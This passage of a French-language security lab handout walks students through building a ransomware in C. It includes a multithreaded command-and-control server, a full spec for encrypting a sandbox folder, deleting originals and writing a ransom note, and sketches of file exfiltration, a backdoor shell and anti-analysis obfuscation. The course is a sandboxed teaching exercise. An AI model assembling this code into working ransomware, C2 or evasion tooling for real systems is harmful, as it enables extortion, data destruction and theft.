    int client_sock = *(int*)arg;
    free(arg);  // Libérer la mémoire allouée pour le socket
    
    C2Command cmd;
    C2Response resp;
    
    printf("[C2] Client connecté\n");
    
    while (1) {
        // Recevoir commande (CODE FOURNI)
        ssize_t received = recv(client_sock, &cmd, sizeof(cmd), 0);
        if (received <= 0) break;  // Client déconnecté
        
        // Initialiser la réponse (CODE FOURNI)
        memset(&resp, 0, sizeof(resp));
        resp.status = 0;
        
        // À COMPLÉTER : Traiter selon cmd.command
        if (strcmp(cmd.command, "STATUS") == 0) {
            strcpy(resp.message, "Server OK");
        }
        else if (strcmp(cmd.command, "ENCRYPT") __ __) {  // Complétez la condition
            snprintf(resp.message, sizeof(resp.message),
                     "Encrypted %s with mode %d", cmd.target, cmd.mode);
        }
        else {
            strcpy(resp.message, "Unknown command");
            resp.status = -1;
        }
        
        // Envoyer réponse (CODE FOURNI)
        send(client_sock, &resp, sizeof(resp), 0);
    }
    
    printf("[C2] Client déconnecté\n");
    close(client_sock);
    return NULL;
}
```

#### 📌 Étape 2 : Fonction main (CODE GUIDÉ)
```c
int main(int argc, char *argv[]) {
    int server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_len = sizeof(client_addr);
    
    // Créer socket (CODE FOURNI)
    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock < 0) {
        perror("Socket creation failed");
        return 1;
    }
    
    // Configuration serveur (CODE FOURNI)
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;  // Écoute sur toutes les interfaces
    server_addr.sin_port = htons(C2_SERVER_PORT);
    
    // Bind (CODE FOURNI)
    if (bind(server_sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        return 1;
    }
    
    // Listen (CODE FOURNI)
    if (listen(server_sock, BACKLOG) < 0) {
        perror("Listen failed");
        return 1;
    }
    
    printf("[C2] Server listening on port %d\n", C2_SERVER_PORT);
    
    // Boucle principale : accepter les clients (CODE FOURNI)
    while (1) {
        client_sock = accept(server_sock, (struct sockaddr*)&client_addr, &addr_len);
        if (client_sock < 0) continue;
        
        // Créer un thread par client (CODE GUIDÉ)
        pthread_t thread;
        int *sock_ptr = malloc(sizeof(int));
        *sock_ptr = client_sock;
        
        // À COMPLÉTER : Créer le thread avec handle_client
        // pthread_create(&thread, NULL, ____________, sock_ptr);
        pthread_detach(thread);  // Thread autonome (ne pas attendre join)
    }
    
    close(server_sock);
    return 0;
}
```

### Programme de test : Utiliser le client du MODULE 8
```bash
# Terminal 1 : Démarrer le serveur
gcc -o c2_server c2_server.c -pthread -I.
./c2_server
# [C2] Server listening on port 4444

# Terminal 2 : Tester avec le client
./test_c2_client
# ✓ Connecté au serveur C2
# Réponse: Server OK (status=0)
# Réponse: Encrypted /tmp/test.txt with mode 0 (status=0)

# Terminal 3 : Tester un 2ème client simultané
./test_c2_client
# ✓ Le serveur gère plusieurs clients en même temps !
```

**Architecture** :
- 1 thread principal → accepte les connexions
- N threads clients → gèrent chaque client indépendamment
- `malloc()` pour passer le socket au thread (évite les races conditions)

### ❓ Questions de réflexion
1. Pourquoi utiliser des threads au lieu de gérer les clients séquentiellement ?
2. Que fait `pthread_detach()` et pourquoi est-ce important ?
3. Pourquoi allouer `sock_ptr` avec `malloc()` au lieu de passer `&client_sock` directement ?
4. Combien de clients maximum peuvent se connecter simultanément ?

---

## 🎯 MODULE 9.5 : Ransomware Complet Autonome

**Objectif** : Créer un programme complet qui combine tous les modules en un ransomware fonctionnel

### 📋 Description

Maintenant que vous avez implémenté tous les modules séparément, il est temps de créer un **programme autonome complet** qui simule un vrai ransomware éducatif.

Ce programme doit :
- ✅ Scanner récursivement le dossier `sandbox/`
- ✅ Chiffrer tous les fichiers trouvés
- ✅ Renommer les fichiers chiffrés avec l'extension `.locked`
- ✅ Générer une note de rançon
- ✅ Afficher un message de rançon visuel
- ✅ Permettre le déchiffrement avec la bonne clé

### 📝 Consignes

Créez un nouveau fichier `ransomware_complet.c` qui :

1. **Utilise vos modules** : Scanner (MODULE 1), XOR Crypto (MODULE 2), Checksum (MODULE 5)
2. **N'a PAS de menu interactif** : Il fonctionne en ligne de commande
3. **Deux modes de fonctionnement** :
   - `./ransomware_complet encrypt` → Chiffre tous les fichiers
   - `./ransomware_complet decrypt` → Déchiffre tous les fichiers

### 🔨 Spécifications techniques

#### Structure du programme

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "scanner.h"
#include "xor_crypto.h"
#include "checksum.h"

#define RANSOM_KEY "MALWARE2026"          // Clé de chiffrement
#define ENCRYPTED_EXTENSION ".locked"      // Extension des fichiers chiffrés
#define RANSOM_NOTE "RANSOM_NOTE.txt"     // Nom de la note de rançon
#define TARGET_DIR "sandbox"              // Dossier cible

// Couleurs pour le terminal (optionnel mais recommandé)
#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define RESET   "\033[0m"
```

#### Fonctions à implémenter

**1. Fonction de chiffrement de masse**
```c
void encrypt_all_files() {
    // 1. Scanner récursivement TARGET_DIR avec scan_recursive()
    // 2. Pour chaque fichier trouvé :
    //    a. Ignorer RANSOM_NOTE et les fichiers déjà .locked
    //    b. Calculer le CRC32 original avec calculate_crc32()
    //    c. Créer le nom du fichier chiffré (ajouter .locked)
    //    d. Chiffrer avec xor_encrypt_file()
    //    e. Supprimer l'original avec remove()
    // 3. Créer la note de rançon avec create_ransom_note()
    // 4. Afficher un message de rançon visuel
}
```

**2. Fonction de génération de la note de rançon**
```c
void create_ransom_note() {
    // Créer le fichier sandbox/RANSOM_NOTE.txt
    // Contenu suggéré :
    // - Titre d'avertissement
    // - Nombre de fichiers chiffrés
    // - Instructions pour déchiffrer
    // - Date et heure
    // - Clé de déchiffrement (mode éducatif)
    
    // Exemple de contenu :
    /*
    ═══════════════════════════════════════════════════════
              ⚠️  AVERTISSEMENT DE SÉCURITÉ ⚠️
    ═══════════════════════════════════════════════════════
    
    TOUS VOS FICHIERS ONT ÉTÉ CHIFFRÉS !
    
    📁 Fichiers affectés : XX fichiers
    🔐 Algorithme : XOR avec clé secrète
    📅 Date : [date]
    
    Pour déchiffrer vos fichiers :
    ./ransomware_complet decrypt
    
    ⚠️  CECI EST UN TP ÉDUCATIF ⚠️
    Clé de déchiffrement : MALWARE2026
    */
}
```

**3. Fonction de déchiffrement de masse**
```c
void decrypt_all_files() {
    // 1. Scanner TARGET_DIR pour trouver les fichiers .locked
    // 2. Demander la clé à l'utilisateur avec scanf()
    // 3. Vérifier si la clé est correcte (strcmp avec RANSOM_KEY)
    // 4. Pour chaque fichier .locked :
    //    a. Construire le nom original (enlever .locked)
    //    b. Déchiffrer avec xor_decrypt_file()
    //    c. Supprimer le fichier .locked
    // 5. Supprimer la note de rançon
    // 6. Afficher un message de succès
}
```

**4. Bannière visuelle (optionnel mais recommandé)**
```c
void print_banner() {
    printf("\n");
    printf(RED);
    printf("╔═══════════════════════════════════════════════════════╗\n");
    printf("║                                                       ║\n");
    printf("║    ⚠️  VOTRE SYSTÈME A ÉTÉ COMPROMIS ! ⚠️           ║\n");
    printf("║                                                       ║\n");
    printf("║    Tous vos fichiers ont été chiffrés !              ║\n");
    printf("║                                                       ║\n");
    printf("╚═══════════════════════════════════════════════════════╝\n");
    printf(RESET);
}
```

**5. Main avec gestion des arguments**
```c
int main(int argc, char *argv[]) {
    if (argc < 2) {
        // Afficher l'aide
        printf("UTILISATION:\n");
        printf("  ./ransomware_complet encrypt  - Chiffrer tous les fichiers\n");
        printf("  ./ransomware_complet decrypt  - Déchiffrer tous les fichiers\n");
        return 1;
    }
    
    if (strcmp(argv[1], "encrypt") == 0) {
        // Demander confirmation
        printf("⚠️  Chiffrer tous les fichiers dans %s ? (o/N): ", TARGET_DIR);
        char confirm;
        scanf(" %c", &confirm);
        if (confirm == 'o' || confirm == 'O') {
            encrypt_all_files();
        }
    } 
    else if (strcmp(argv[1], "decrypt") == 0) {
        decrypt_all_files();
    }
    else {
        printf("Commande inconnue: %s\n", argv[1]);
        return 1;
    }
    
    return 0;
}
```

### 🔧 Compilation

Compilez directement avec gcc :

```bash
gcc -Wall -Wextra -I. -o ransomware_complet ransomware_complet.c modules.c
```

Explications des options :
- `-Wall -Wextra` : Active tous les avertissements (bonne pratique)
- `-I.` : Inclut le répertoire courant pour les headers
- `-o ransomware_complet` : Nom du binaire généré
- `ransomware_complet.c modules.c` : Fichiers sources à compiler

### 🧪 Tests

**1. Test de chiffrement**
```bash
# Préparer le sandbox
cd /vagrant/TP
bash ../setup_sandbox.sh

# Lancer le chiffrement
./ransomware_complet encrypt
# Confirmer avec 'o'

# Vérifier les fichiers
ls sandbox/
# Tous les fichiers doivent avoir l'extension .locked
# La note RANSOM_NOTE.txt doit être présente

cat sandbox/RANSOM_NOTE.txt
# Lire la note de rançon
```

**2. Test de déchiffrement**
```bash
./ransomware_complet decrypt
# Entrer la clé : MALWARE2026

# Vérifier que les fichiers sont restaurés
ls sandbox/
# Les fichiers doivent avoir retrouvé leur nom original
```

### ✅ Critères de validation

Votre programme est validé si :

1. ✅ **Chiffrement** : Tous les fichiers du sandbox sont chiffrés avec l'extension `.locked`
2. ✅ **Note de rançon** : Le fichier `RANSOM_NOTE.txt` est créé avec des instructions claires
3. ✅ **Message visuel** : Une bannière colorée s'affiche après le chiffrement
4. ✅ **Déchiffrement** : Tous les fichiers sont restaurés avec la bonne clé
5. ✅ **Sécurité** : Le programme refuse de déchiffrer avec une mauvaise clé
6. ✅ **Robustesse** : Aucun crash même avec un sandbox vide
7. ✅ **Compteurs** : Affiche le nombre de fichiers chiffrés/déchiffrés

### 💡 Améliorations possibles (bonus)

- 📊 Afficher une barre de progression pendant le chiffrement
- 🎨 Utiliser des couleurs ANSI pour les messages (rouge/vert/jaune)
- 📈 Sauvegarder les checksums dans un fichier pour vérifier l'intégrité
- ⏱️ Afficher le temps écoulé pour le chiffrement
- 🔢 Compter et afficher la taille totale des fichiers chiffrés
- 📝 Logger toutes les opérations dans un fichier `ransomware.log`

### ❓ Questions de réflexion

1. Pourquoi supprimer l'original après chiffrement au lieu de le remplacer ?
2. Pourquoi utiliser XOR au lieu d'un algorithme plus complexe comme AES ?
3. Comment un vrai ransomware empêche-t-il le déchiffrement sans paiement ?
4. Quelles traces ce programme laisse-t-il sur le système ?
5. Comment détecter et bloquer ce type de programme ?

### 🛡️ Rappel de sécurité

⚠️ **CE PROGRAMME EST STRICTEMENT ÉDUCATIF**

- ❌ Ne JAMAIS l'exécuter en dehors du dossier `sandbox/`
- ❌ Ne JAMAIS l'exécuter sur de vrais fichiers
- ❌ Ne JAMAIS le distribuer ou l'utiliser malicieusement
- ✅ Toujours travailler dans la VM isolée
- ✅ Utiliser uniquement pour apprendre les concepts

**Toute utilisation malveillante est illégale et passible de sanctions pénales.**

---

## 📤 MODULE 10 : Exfiltration de Données (OPTIONNEL)

**Objectif** : Envoyer des fichiers vers le C2

⚠️ **Module avancé optionnel** - Réservé aux groupes ayant terminé les modules 1-9

### Concepts clés
- Lecture de fichiers par chunks (1MB)
- Encodage Base64 pour transmission sûre
- Envoi via socket C2
- Gestion des acknowledgments

### Structure suggérée
```c
int exfiltrate_file(const char *filepath, const char *c2_ip, int c2_port) {
    // 1. Se connecter au C2 (réutiliser c2_connect)
    // 2. Ouvrir le fichier à exfiltrer
    // 3. Boucle : Lire 1MB, encoder Base64, envoyer, attendre ACK
    // 4. Fermer fichier et socket
}
```

**Consultez les corrections si vous implémentez ce module.**

---

## 🚪 MODULE 11 : Backdoor (OPTIONNEL)

**Objectif** : Shell limité avec whitelist

⚠️ **Module avancé optionnel** - Réservé aux groupes ayant terminé les modules 1-9

### Concepts clés
- Serveur socket écoute sur port 5555
- Accepte connexions clients (nc localhost 5555)
- Whitelist de commandes autorisées : ls, pwd, cat, whoami, id
- Exécution via popen() / system()
- **Sécurité critique** : Valider TOUTES les entrées

### Structure suggérée
```c
int is_whitelisted(const char *command) {
    // Vérifier si command est dans la whitelist
}

char* execute_command(const char *command) {
    if (!is_whitelisted(command)) return "ERROR";
    // Utiliser popen() pour exécuter et capturer sortie
}

int start_backdoor(int port) {
    // Créer socket serveur (comme MODULE 9)
    // Accepter client
    // Lire commandes, exécuter, renvoyer résultats
}
```

**Consultez les corrections si vous implémentez ce module.**

---

## 🎭 MODULE 12 : Obfuscation de Code (OPTIONNEL)

**Objectif** : Rendre l'analyse statique difficile

⚠️ **Module avancé optionnel** - Réservé aux groupes ayant terminé les modules 1-9

### Techniques à implémenter

#### 1. XOR des strings
```c
// Au lieu de : char key[] = "ENCRYPT";
char encrypted_key[] = {0x2B, 0x27, 0x21, 0x36, 0x32, 0x36, 0x00}; // XOR 0x42
// Déchiffrer à l'exécution
```

#### 2. Indirection de fonctions
```c
FunctionPtr functions[] = {encrypt_xor, encrypt_caesar, encrypt_rot13};
int result = functions[mode]("file.txt");  // Appel indirect
```

#### 3. Prédicats opaques
```c
if ((x*x + y*y) >= 2*x*y) {  // Toujours vrai, difficile à analyser
    // Code réel
}
```

#### 4. Control Flow Flattening
```c
int state = 0;
while (state != EXIT) {
    switch (state) {
        case 0: init(); state = rand() % 2 ? 1 : 2; break;
        case 1: scan(); state = 3; break;
        case 2: config(); state = 1; break;
        // ...
    }
}
```

### Test
```bash
strings ransomware | grep -i encrypt    # Trouve "ENCRYPT"
strings ransomware_obf | grep -i encrypt  # Ne trouve rien !
```

**Consultez les corrections si vous implémentez ce module.**

---

## ⚠️ Rappels Importants

1. **JAMAIS exécuter en dehors du sandbox**
2. **JAMAIS utiliser sur des systèmes réels**
3. Supprimer tous les binaires après le TP

---

## 🆘 Aide et Ressources

### En cas de blocage
1. Consultez `Cours/Cours_Ransomware_Educatif.md`
2. Regardez les corrections dans `corrections/etapeX.c`
3. Demandez à l'enseignant

### Références utiles
- `man socket` : Programmation réseau
- `man opendir` : Parcours de répertoires
- `man pthread` : Threads POSIX

---

**Bon courage et codez de manière responsable !** 🛡️
